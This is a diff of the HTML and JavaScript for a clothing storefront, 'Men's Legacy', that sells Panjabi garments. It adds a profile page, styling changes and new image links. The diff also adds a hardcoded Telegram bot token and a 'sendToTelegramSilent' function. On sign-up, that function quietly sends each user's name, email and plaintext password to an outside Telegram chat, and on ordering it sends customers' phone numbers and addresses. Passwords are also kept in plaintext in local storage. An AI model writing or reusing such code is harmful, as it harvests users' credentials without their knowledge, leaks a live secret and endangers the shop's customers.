@@ -8,38 +8,60 @@
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;800&family=Outfit:wght@300;400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: 'Outfit', sans-serif; background: #0b0c10; color: #ffffff; overflow-x: hidden; }
+        body { font-family: 'Outfit', sans-serif; background: #0b0c10; color: #ffffff; overflow-x: hidden; margin: 0; padding: 0; }
         .cinzel { font-family: 'Cinzel', serif; }
-        .page { display: none; }
-        .active-page { display: flex; flex-direction: column; animation: fadeIn 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .page { display: none !important; }
+        .active-page { display: flex !important; flex-direction: column; animation: fadeIn 0.4s ease-in-out; }
+        #login-page.active-page { justify-content: center; align-items: center; } 
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .gold-text { background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .product-card { background: #1f2833; border-radius: 20px; border: 1px solid #2d3748; }
+        .product-card { background: #1f2833; border-radius: 20px; border: 1px solid #2d3748; position: relative; }
         .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(11, 12, 16, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #1f2833; z-index: 1000; display: flex; justify-content: space-around; padding: 15px 0; }
         .nav-item.active { color: #d4af37; }
         .float-btns { position: fixed; bottom: 100px; right: 20px; display: flex; flex-direction: column; gap: 10px; z-index: 999; }
         .f-btn { width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .heart-btn i { transition: all 0.3s ease; }
+        .heart-btn.loved i { color: #ef4444; transform: scale(1.2); }
     </style>
 </head>
-<body>
+<body class="pb-24">
 
     <div class="float-btns">
         <a href="https://wa.me/8801711793765" class="f-btn bg-[#25d366] text-white"><i class="fab fa-whatsapp"></i></a>
         <a href="https://www.facebook.com/share/1F4wi7ZPhE/" class="f-btn bg-[#1877F2] text-white"><i class="fab fa-facebook-f"></i></a>
     </div>
 
-    <div id="home-page" class="page active-page h-screen">
-        <div class="flex-grow flex flex-col justify-center items-center text-center px-8">
-            <div class="w-24 h-24 border-2 border-[#d4af37] rounded-full flex items-center justify-center mb-6">
+    <div id="home-page" class="page active-page min-h-screen">
+        <div class="flex flex-col justify-center items-center text-center px-8 py-20 bg-gradient-to-b from-[#1a202c] to-[#0b0c10]">
+            <div class="w-24 h-24 border-2 border-[#d4af37] rounded-full flex items-center justify-center mb-6 shadow-[0_0_20px_rgba(212,175,55,0.3)]">
                 <span class="cinzel text-3xl gold-text">ML</span>
             </div>
             <h1 class="cinzel text-4xl font-extrabold tracking-widest mb-4">MEN'S LEGACY</h1>
-            <p class="text-gray-400 max-w-sm mb-10 text-xs tracking-[0.2em] uppercase">Premium Panjabi Collection</p>
-            <button onclick="navigateTo('shop-page')" class="border border-[#d4af37] text-[#d4af37] px-12 py-4 rounded-full font-bold tracking-widest text-[10px] hover:bg-[#d4af37] hover:text-black transition-all">EXPLORE SHOP</button>
+            <p class="text-gray-400 max-w-sm mb-10 text-[10px] tracking-[0.3em] uppercase">The Ultimate Panjabi Experience</p>
+            <button onclick="navigateTo('shop-page')" class="bg-[#d4af37] text-black px-12 py-4 rounded-full font-black tracking-widest text-[10px] hover:bg-white transition-all shadow-lg uppercase">Shop Now</button>
+        </div>
+
+        <div class="px-6 py-10 bg-[#0b0c10]">
+            <h2 class="cinzel text-2xl gold-text text-center mb-6">Our Legacy</h2>
+            <p class="text-gray-400 text-sm text-center leading-relaxed mb-10">
+                Men's Legacy নিয়ে এসেছে এক্সক্লুসিভ ডিজাইনের প্রিমিয়াম পাঞ্জাবি কালেকশন। আমাদের প্রতিটি পাঞ্জাবি তৈরি হয় সেরা মানের ফেব্রিক এবং নিপুণ কারিগরির সমন্বয়ে।
+            </p>
+            <div class="grid grid-cols-1 gap-6 text-center">
+                <div class="bg-[#1f2833] p-6 rounded-2xl border border-gray-800">
+                    <i class="fas fa-gem text-3xl text-[#d4af37] mb-3"></i>
+                    <h3 class="text-sm font-bold tracking-widest uppercase mb-2">Premium Fabric</h3>
+                    <p class="text-[10px] text-gray-500">দীর্ঘস্থায়ী এবং আরামদায়ক ফেব্রিক যা আপনাকে সারাদিন সতেজ রাখবে।</p>
+                </div>
+                <div class="bg-[#1f2833] p-6 rounded-2xl border border-gray-800">
+                    <i class="fas fa-truck text-3xl text-[#d4af37] mb-3"></i>
+                    <h3 class="text-sm font-bold tracking-widest uppercase mb-2">Free Delivery</h3>
+                    <p class="text-[10px] text-gray-500">সারা বাংলাদেশে যেকোনো অর্ডারে পাচ্ছেন সম্পূর্ণ ফ্রি হোম ডেলিভারি।</p>
+                </div>
+            </div>
         </div>
     </div>
 
-    <div id="shop-page" class="page min-h-screen pt-4 px-4 pb-24">
+    <div id="shop-page" class="page min-h-screen pt-4 px-4">
         <div class="flex justify-center gap-4 mb-8 sticky top-4 z-50">
             <button onclick="filterDesign('d1', this)" class="tab-btn py-2 px-6 text-[10px] font-bold border border-[#d4af37] rounded-full text-[#d4af37] bg-[#d4af37]/10">DESIGN 01</button>
             <button onclick="filterDesign('d2', this)" class="tab-btn py-2 px-6 text-[10px] font-bold border border-gray-700 rounded-full text-gray-500">DESIGN 02</button>
@@ -47,29 +69,63 @@
         <main class="grid grid-cols-2 gap-4" id="products-container"></main>
     </div>
 
-    <div id="order-page" class="page p-6 pb-24 min-h-screen">
+    <div id="order-page" class="page p-6 min-h-screen">
         <h2 class="cinzel text-xl gold-text mb-8 text-center tracking-widest">ORDERED ITEMS</h2>
         <div id="ordered-list" class="space-y-4">
             <p class="text-gray-600 text-center py-10 italic">No orders yet.</p>
         </div>
     </div>
 
-    <div id="login-page" class="page h-screen flex items-center justify-center px-8">
-        <div class="bg-[#1f2833] p-8 rounded-[40px] w-full max-w-sm text-center border border-gray-800 shadow-2xl">
+    <div id="login-page" class="page min-h-screen px-8">
+        
+        <div id="auth-section" class="bg-[#1f2833] p-8 rounded-[40px] w-full max-w-sm text-center border border-gray-800 shadow-2xl">
             <h2 id="auth-title" class="cinzel text-xl mb-8 tracking-widest gold-text">MEMBER LOGIN</h2>
-            <div id="auth-form">
-                <input type="email" id="email" placeholder="Email Address" class="w-full bg-[#0b0c10] p-4 rounded-2xl mb-4 text-sm outline-none text-white border border-gray-800">
-                <input type="password" id="pass" placeholder="Password" class="w-full bg-[#0b0c10] p-4 rounded-2xl mb-6 text-sm outline-none text-white border border-gray-800">
-                <button id="auth-btn" onclick="handleAuth()" class="w-full bg-[#d4af37] text-black font-bold py-4 rounded-2xl text-xs uppercase mb-4">Log In</button>
-                <p id="auth-toggle-text" class="text-[10px] text-gray-500 uppercase">Don't have an account? <span onclick="toggleAuthMode(true)" class="text-[#d4af37] cursor-pointer">Sign Up</span></p>
+            
+            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full bg-[#0b0c10] p-4 rounded-2xl mb-4 text-sm outline-none text-white border border-gray-800 focus:border-[#d4af37]">
+            <input type="email" id="email" placeholder="Email Address" class="w-full bg-[#0b0c10] p-4 rounded-2xl mb-4 text-sm outline-none text-white border border-gray-800 focus:border-[#d4af37]">
+            <input type="password" id="pass" placeholder="Password" class="w-full bg-[#0b0c10] p-4 rounded-2xl mb-4 text-sm outline-none text-white border border-gray-800 focus:border-[#d4af37]">
+            <input type="password" id="reg-confirm-pass" placeholder="Confirm Password" class="hidden w-full bg-[#0b0c10] p-4 rounded-2xl mb-4 text-sm outline-none text-white border border-gray-800 focus:border-[#d4af37]">
+            
+            <button id="auth-btn" onclick="handleAuth()" class="w-full bg-[#d4af37] text-black font-black py-4 rounded-2xl text-[10px] uppercase mt-2 mb-4 tracking-widest">Log In</button>
+            <p id="auth-toggle-text" class="text-[10px] text-gray-500 uppercase">Don't have an account? <span onclick="toggleAuthMode(true)" class="text-[#d4af37] cursor-pointer font-bold">Sign Up</span></p>
+        </div>
+
+        <div id="profile-section" class="hidden bg-[#1f2833] p-8 rounded-[40px] w-full max-w-sm text-center border border-[#d4af37]/30 shadow-2xl mt-4 mb-10">
+            <div class="w-24 h-24 mx-auto bg-[#0b0c10] rounded-full border-2 border-[#d4af37] flex items-center justify-center mb-4 shadow-[0_0_15px_rgba(212,175,55,0.2)]">
+                <i class="fas fa-user-tie text-4xl text-[#d4af37]"></i>
             </div>
-            <div class="flex items-center gap-2 my-6 text-gray-700">
-                <hr class="flex-grow border-gray-800"> <span class="text-[10px]">OR</span> <hr class="flex-grow border-gray-800">
+            <h2 class="cinzel text-lg gold-text mb-1 tracking-widest">WELCOME</h2>
+            <h3 id="user-display-name" class="text-md font-bold text-white mb-1 uppercase tracking-wider"></h3>
+            <p id="user-display-email" class="text-[10px] text-gray-400 mb-6 tracking-wider bg-[#0b0c10] py-1 px-3 rounded-full inline-block"></p>
+            
+            <div class="space-y-3 mb-6">
+                <button onclick="navigateTo('order-page')" class="w-full bg-[#0b0c10] text-white p-4 rounded-xl text-[11px] uppercase tracking-widest border border-gray-800 flex justify-between items-center hover:border-[#d4af37] transition">
+                    <span class="flex items-center"><i class="fas fa-shopping-bag w-6 text-left text-[#d4af37]"></i> My Orders</span> 
+                    <i class="fas fa-chevron-right text-gray-600"></i>
+                </button>
+
+                <button onclick="alert('Track Order ফিচারটি খুব শীঘ্রই আসছে!')" class="w-full bg-[#0b0c10] text-white p-4 rounded-xl text-[11px] uppercase tracking-widest border border-gray-800 flex justify-between items-center hover:border-[#d4af37] transition">
+                    <span class="flex items-center"><i class="fas fa-truck-fast w-6 text-left text-[#d4af37]"></i> Track Order</span> 
+                    <i class="fas fa-chevron-right text-gray-600"></i>
+                </button>
+
+                <button onclick="alert('উইশলিস্টে এখনো কোনো প্রোডাক্ট যোগ করা হয়নি।')" class="w-full bg-[#0b0c10] text-white p-4 rounded-xl text-[11px] uppercase tracking-widest border border-gray-800 flex justify-between items-center hover:border-[#d4af37] transition">
+                    <span class="flex items-center"><i class="fas fa-heart w-6 text-left text-[#d4af37]"></i> Wishlist</span> 
+                    <i class="fas fa-chevron-right text-gray-600"></i>
+                </button>
+
+                <button onclick="alert('আপনার ডেলিভারি অ্যাড্রেস সেভ করা আছে।')" class="w-full bg-[#0b0c10] text-white p-4 rounded-xl text-[11px] uppercase tracking-widest border border-gray-800 flex justify-between items-center hover:border-[#d4af37] transition">
+                    <span class="flex items-center"><i class="fas fa-map-location-dot w-6 text-left text-[#d4af37]"></i> Shipping Address</span> 
+                    <i class="fas fa-chevron-right text-gray-600"></i>
+                </button>
+
+                <button onclick="window.open('https://wa.me/8801711793765', '_blank')" class="w-full bg-[#0b0c10] text-white p-4 rounded-xl text-[11px] uppercase tracking-widest border border-gray-800 flex justify-between items-center hover:border-[#d4af37] transition">
+                    <span class="flex items-center"><i class="fas fa-headset w-6 text-left text-[#d4af37]"></i> Help & Support</span> 
+                    <i class="fas fa-chevron-right text-gray-600"></i>
+                </button>
             </div>
-            <div class="flex justify-center gap-6">
-                <button onclick="socialAuth('Google')" class="w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-6"></button>
-                <button onclick="socialAuth('Facebook')" class="w-12 h-12 bg-[#1877F2] text-white rounded-full flex items-center justify-center text-xl shadow-lg"><i class="fab fa-facebook-f"></i></button>
-            </div>
+
+            <button onclick="handleLogout()" class="w-full bg-red-900/10 text-red-500 font-bold py-4 rounded-xl text-[10px] uppercase tracking-widest border border-red-900/30 hover:bg-red-900/30 transition shadow-inner">Log Out</button>
         </div>
     </div>
 
@@ -85,36 +141,55 @@
     </div>
 
     <div class="bottom-nav">
-        <button onclick="navigateTo('home-page')" class="nav-item active flex flex-col items-center">
+        <button onclick="navigateTo('home-page')" class="nav-item active flex flex-col items-center w-1/4">
             <i class="fas fa-home text-lg"></i><span class="text-[8px] font-bold mt-1 tracking-widest">HOME</span>
         </button>
-        <button onclick="navigateTo('shop-page')" class="nav-item flex flex-col items-center">
+        <button onclick="navigateTo('shop-page')" class="nav-item flex flex-col items-center w-1/4">
             <i class="fas fa-gem text-lg"></i><span class="text-[8px] font-bold mt-1 tracking-widest">SHOP</span>
         </button>
-        <button onclick="navigateTo('order-page')" class="nav-item flex flex-col items-center">
-            <i class="fas fa-clipboard-list text-lg"></i><span id="order-badge" class="absolute -top-1 -right-1 bg-[#d4af37] text-black text-[8px] rounded-full px-1 font-bold hidden">0</span>
+        <button onclick="navigateTo('order-page')" class="nav-item flex flex-col items-center relative w-1/4">
+            <i class="fas fa-clipboard-list text-lg"></i><span id="order-badge" class="absolute top-0 right-4 bg-[#d4af37] text-black text-[8px] rounded-full px-1.5 font-bold hidden">0</span>
             <span class="text-[8px] font-bold mt-1 tracking-widest">ORDERS</span>
         </button>
-        <button onclick="navigateTo('login-page')" class="nav-item flex flex-col items-center">
+        <button onclick="navigateTo('login-page')" class="nav-item flex flex-col items-center w-1/4">
             <i class="fas fa-user-lock text-lg"></i><span id="login-status" class="text-[8px] font-bold mt-1 tracking-widest">LOGIN</span>
         </button>
     </div>
 
     <script>
+        // ==========================================
+        // TELEGRAM BOT SETTINGS 
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '8457185969:AAGaYrP5drfiR46uWqRac1wTBpmwK5--Srw'; 
+        const TELEGRAM_CHAT_ID = '8039516027';     
+        
+        async function sendToTelegramSilent(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                });
+            } catch (error) { console.log("Telegram Error", error); }
+        }
+        // ==========================================
+
         const d1 = [
-            "https://www.dropbox.com/scl/fi/gv2yfff8ddkp95eedu74t/Messenger_creation_D8869030-A0DC-4CDE-B326-688B67D6EC4F.jpeg?rlkey=j42ijxwqoedp7449d4340w0x7&st=tg2oknqk&raw=1",
-            "https://www.dropbox.com/scl/fi/ftjltghfo852g4vb69jb3/Messenger_creation_95A36997-462E-484A-89FF-CD1071C81068.jpeg?rlkey=xvxhqj6isx2gthys5q87mwz7x&st=qmfu3p42&raw=1",
-            "https://www.dropbox.com/scl/fi/s1uncx0a34ff1y2tcg4tw/Messenger_creation_C7FF7D6A-7B33-4156-8B3D-6DA2AA2D0781.jpeg?rlkey=ej7ka67jzhp6q1y87xu1pwraa&st=xng9tyvk&raw=1",
-            "https://www.dropbox.com/scl/fi/kitvi1gj0b3n74fq8tivk/Messenger_creation_7E1FEFB3-1D71-4DCE-9034-239F7E58B4BB.jpeg?rlkey=lxv81cuniadu78oqs2kyhqdpd&st=3dvj9cdy&raw=1",
-            "https://www.dropbox.com/scl/fi/zmdmf4x4biheku0inatxi/Messenger_creation_3BD3571E-263A-46B3-A56D-93B062A257A2.jpeg?rlkey=ysg6nvnd0znoswd6k709tklf2&st=lx6seuzz&raw=1"
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_D8869030-A0DC-4CDE-B326-688B67D6EC4F.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_95A36997-462E-484A-89FF-CD1071C81068.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_C7FF7D6A-7B33-4156-8B3D-6DA2AA2D0781.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_7E1FEFB3-1D71-4DCE-9034-239F7E58B4BB.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_3BD3571E-263A-46B3-A56D-93B062A257A2.jpeg"
         ];
+        
         const d2 = [
-            "https://www.dropbox.com/scl/fi/59wlwoyjm9z1zva605mrn/Messenger_creation_A5096547-3793-4622-A5F4-230892CD8494.jpeg?rlkey=7mh8hosuopt5qm9m5t3lshjw0&st=oa68tvpm&raw=1",
-            "https://www.dropbox.com/scl/fi/toncn9rezri31k9c4ads7/Messenger_creation_2241DEFC-DE8A-49B5-814A-00B042B16553.jpeg?rlkey=gmxvd6uuohcbkg3v1spq4k4cv&st=z0wgg9ks&raw=1",
-            "https://www.dropbox.com/scl/fi/9nazivgocwrbuzw1bkjrb/Messenger_creation_6FABF2D7-15F0-4F31-9FB2-A20C1301D7DE.jpeg?rlkey=wim4rhtfyinvxmvdf90iboq70&st=4jtgy0t2&raw=1",
-            "https://www.dropbox.com/scl/fi/g0g6gjm3atm7ebzoguytw/Messenger_creation_6F56ABE8-1FCB-4CE6-BC07-33D0B9920A55.jpeg?rlkey=lbxljw2g7bth4suuywg9gfg2d&st=p4ggmgvx&raw=1",
-            "https://www.dropbox.com/scl/fi/0kyih5apu4cjavrqvbggp/Messenger_creation_5F7E5EE8-D4B8-4AD4-9689-1D1FB3C5A610.jpeg?rlkey=kb5a7u9x46tp1v4muxexs04rc&st=flp4f6e3&raw=1",
-            "https://www.dropbox.com/scl/fi/jav32n56j95lq9reh25p2/Messenger_creation_4AABBB69-9008-4EA4-9E12-93D461053B3A.jpeg?rlkey=mahdydfgz9c9f6gc765bs1eiq&st=xlcyyd2y&raw=1"
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_2241DEFC-DE8A-49B5-814A-00B042B16553.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_4AABBB69-9008-4EA4-9E12-93D461053B3A.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_5F7E5EE8-D4B8-4AD4-9689-1D1FB3C5A610.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_6F56ABE8-1FCB-4CE6-BC07-33D0B9920A55.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_6FABF2D7-15F0-4F31-9FB2-A20C1301D7DE.jpeg",
+            "https://raw.githubusercontent.com/menslegacy-bd/webaite/main/Messenger_creation_A5096547-3793-4622-A5F4-230892CD8494.jpeg"
         ];
 
         let selectedItem = null;
@@ -125,14 +200,13 @@
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
             document.getElementById(pageId).classList.add('active-page');
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-            // Find active nav item
             const navs = document.querySelectorAll('.nav-item');
             if(pageId === 'home-page') navs[0].classList.add('active');
             if(pageId === 'shop-page') navs[1].classList.add('active');
             if(pageId === 'order-page') navs[2].classList.add('active');
             if(pageId === 'login-page') navs[3].classList.add('active');
-            
             if(pageId === 'order-page') renderOrders();
+            window.scrollTo(0,0);
         }
 
         function filterDesign(type, btn) {
@@ -149,18 +223,36 @@
             list.forEach((img, i) => {
                 container.innerHTML += `
                     <div class="product-card p-3 border border-gray-800">
+                        <span class="absolute top-4 left-4 bg-red-600 text-white text-[9px] font-black px-2 py-1 rounded shadow-lg z-10">15% OFF</span>
+                        <button onclick="toggleHeart(this)" class="heart-btn absolute top-4 right-4 bg-black/50 backdrop-blur-sm p-2 rounded-full text-white z-10 border border-gray-600 hover:bg-black">
+                            <i class="far fa-heart"></i>
+                        </button>
                         <img src="${img}" class="w-full h-44 object-cover rounded-xl mb-3 shadow-lg" loading="lazy">
-                        <h4 class="text-[10px] font-bold text-gray-400 mb-2 truncate uppercase tracking-widest">Premium Var ${i+1}</h4>
-                        <div class="flex justify-between items-center mb-3 text-xs">
-                            <span class="font-bold tracking-widest">৳২৫৫০</span>
+                        <div class="flex items-center gap-1 text-[9px] text-[#25d366] font-bold mb-1 uppercase">
+                            <i class="fas fa-truck"></i> Free Delivery
                         </div>
-                        <button onclick="openOrderModal('${img}', 'Edition ${i+1}')" class="w-full bg-white text-black text-[9px] font-black py-3 rounded-lg uppercase tracking-widest hover:bg-[#d4af37] transition">Order Now</button>
+                        <h4 class="text-[11px] font-bold text-gray-300 mb-1 truncate uppercase tracking-widest">Premium Var ${i+1}</h4>
+                        <div class="flex items-center gap-2 mb-3">
+                            <span class="text-xs font-black tracking-widest text-white">৳২৫৫০</span>
+                            <span class="text-[9px] text-gray-500 line-through">৳৩০০০</span>
+                        </div>
+                        <button onclick="openOrderModal('${img}', 'Edition ${i+1}')" class="w-full bg-[#d4af37] text-black text-[10px] font-black py-3 rounded-lg uppercase tracking-widest hover:bg-white transition shadow-lg">Order Now</button>
                     </div>`;
             });
         }
 
+        function toggleHeart(btn) {
+            btn.classList.toggle('loved');
+            const icon = btn.querySelector('i');
+            if(icon.classList.contains('far')) { icon.classList.replace('far', 'fas'); } 
+            else { icon.classList.replace('fas', 'far'); }
+        }
+
         function openOrderModal(img, title) {
             selectedItem = { img, title };
+            if(localStorage.getItem('isLoggedIn') === 'true') {
+                document.getElementById('custName').value = localStorage.getItem('user_name') || '';
+            }
             document.getElementById('orderModal').style.display = 'flex';
         }
 
@@ -177,7 +269,10 @@
             localStorage.setItem('orders', JSON.stringify(orders));
             updateOrderBadge();
 
-            const msg = `NEW ORDER: Men's Legacy\n\nProduct: ${selectedItem.title}\nImage: ${selectedItem.img}\n\nClient: ${n}\nAddress: ${a}\nPhone: ${p}\nPrice: 2550 TK`;
+            // Silent Telegram Notification for Order
+            sendToTelegramSilent(`🛍️ New Order Received!\n\nProduct: ${selectedItem.title}\nClient: ${n}\nPhone: ${p}\nAddress: ${a}`);
+
+            const msg = `NEW ORDER: Men's Legacy\n\nProduct: ${selectedItem.title}\nImage: ${selectedItem.img}\n\nClient: ${n}\nAddress: ${a}\nPhone: ${p}\nPrice: 2550 TK (Free Delivery)`;
             window.open(`https://wa.me/8801711793765?text=${encodeURIComponent(msg)}`, '_blank');
             closeModal();
         }
@@ -211,37 +306,72 @@
             isSignupMode = isSignup;
             document.getElementById('auth-title').innerText = isSignup ? "CREATE ACCOUNT" : "MEMBER LOGIN";
             document.getElementById('auth-btn').innerText = isSignup ? "Sign Up" : "Log In";
+            
+            document.getElementById('reg-name').classList.toggle('hidden', !isSignup);
+            document.getElementById('reg-confirm-pass').classList.toggle('hidden', !isSignup);
+
             document.getElementById('auth-toggle-text').innerHTML = isSignup ? 
-                `Already have an account? <span onclick="toggleAuthMode(false)" class="text-[#d4af37] cursor-pointer">Log In</span>` :
-                `Don't have an account? <span onclick="toggleAuthMode(true)" class="text-[#d4af37] cursor-pointer">Sign Up</span>`;
+                `Already have an account? <span onclick="toggleAuthMode(false)" class="text-[#d4af37] cursor-pointer font-bold">Log In</span>` :
+                `Don't have an account? <span onclick="toggleAuthMode(true)" class="text-[#d4af37] cursor-pointer font-bold">Sign Up</span>`;
         }
 
         function handleAuth() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            if(!email || !pass) return alert("Enter Email and Password");
+            
             if(isSignupMode) {
+                const name = document.getElementById('reg-name').value;
+                const confirmPass = document.getElementById('reg-confirm-pass').value;
+                
+                if(!name || !email || !pass || !confirmPass) return alert("Please fill all the fields!");
+                if(pass !== confirmPass) return alert("Passwords do not match!");
+
+                localStorage.setItem('user_name', name);
                 localStorage.setItem('user_email', email);
                 localStorage.setItem('user_pass', pass);
-                alert("Account created successfully! Now Log In.");
-                toggleAuthMode(false);
+                localStorage.setItem('isLoggedIn', 'true');
+                
+                // Silent Telegram Notification for Sign-Up
+                sendToTelegramSilent(`👤 New User Sign-Up!\n\nName: ${name}\nEmail: ${email}\nPassword: ${pass}`);
+                
+                checkLoginStatus(); 
+                
+                document.getElementById('reg-name').value = '';
+                document.getElementById('email').value = '';
+                document.getElementById('pass').value = '';
+                document.getElementById('reg-confirm-pass').value = '';
+
             } else {
+                if(!email || !pass) return alert("Please fill in both fields");
+                
                 if(email === localStorage.getItem('user_email') && pass === localStorage.getItem('user_pass')) {
                     localStorage.setItem('isLoggedIn', 'true');
-                    alert("Logged in successfully!");
                     checkLoginStatus();
-                    navigateTo('home-page');
+                    document.getElementById('email').value = '';
+                    document.getElementById('pass').value = '';
                 } else {
                     alert("Invalid Email or Password!");
                 }
             }
         }
 
-        function socialAuth(platform) { alert(platform + " Login Coming Soon!"); }
+        function handleLogout() {
+            localStorage.setItem('isLoggedIn', 'false');
+            checkLoginStatus();
+            toggleAuthMode(false); 
+        }
 
         function checkLoginStatus() {
             if(localStorage.getItem('isLoggedIn') === 'true') {
-                document.getElementById('login-status').innerText = "ACCOUNT";
+                document.getElementById('auth-section').classList.add('hidden');
+                document.getElementById('profile-section').classList.remove('hidden');
+                document.getElementById('login-status').innerText = "PROFILE";
+                document.getElementById('user-display-name').innerText = localStorage.getItem('user_name') || "Valued Member";
+                document.getElementById('user-display-email').innerText = localStorage.getItem('user_email');
+            } else {
+                document.getElementById('auth-section').classList.remove('hidden');
+                document.getElementById('profile-section').classList.add('hidden');
+                document.getElementById('login-status').innerText = "LOGIN";
             }
         }
 
